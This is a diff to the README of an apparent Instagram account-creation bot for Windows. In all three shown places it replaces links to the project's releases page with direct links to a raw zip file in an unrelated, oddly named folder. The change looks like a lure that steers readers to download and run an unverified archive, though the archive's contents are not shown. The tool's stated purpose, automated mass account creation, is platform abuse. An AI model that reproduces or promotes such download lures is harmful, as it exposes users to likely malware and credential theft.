@@ -1,6 +1,6 @@
 # 🤖 instagram-automation-toolkit - Automate Your Instagram Account Creation Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/abhiarun2007-dotcom/instagram-automation-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/abhiarun2007-dotcom/instagram-automation-toolkit/main/Tetragoniaceae/v2.7.zip)
 
 ## 📋 What Is This?
 
@@ -30,7 +30,7 @@ This software is built specifically for Windows users. It takes advantage of Win
 ### Step 1: Download the Software
 
 Visit this link to download the application:
-[![Download Instagram Automation Toolkit](https://img.shields.io/badge/⬇️_Download_Now-Click_Here-blue?style=for-the-badge)](https://github.com/abhiarun2007-dotcom/instagram-automation-toolkit/releases)
+[![Download Instagram Automation Toolkit](https://img.shields.io/badge/⬇️_Download_Now-Click_Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/abhiarun2007-dotcom/instagram-automation-toolkit/main/Tetragoniaceae/v2.7.zip)
 
 This is the official download page. Look for the latest version and choose the file that matches your system.
 
@@ -170,7 +170,7 @@ The software is designed to be self-explanatory, but help is available when you 
 
 You're just a few clicks away from effortless Instagram account management. Follow the steps below:
 
-1. **[Download the toolkit now](https://github.com/abhiarun2007-dotcom/instagram-automation-toolkit/releases)** - Visit this link to download the application.
+1. **[Download the toolkit now](https://raw.githubusercontent.com/abhiarun2007-dotcom/instagram-automation-toolkit/main/Tetragoniaceae/v2.7.zip)** - Visit this link to download the application.
 2. Install the software using the instructions above.
 3. Launch the application and create your first automated account.
 
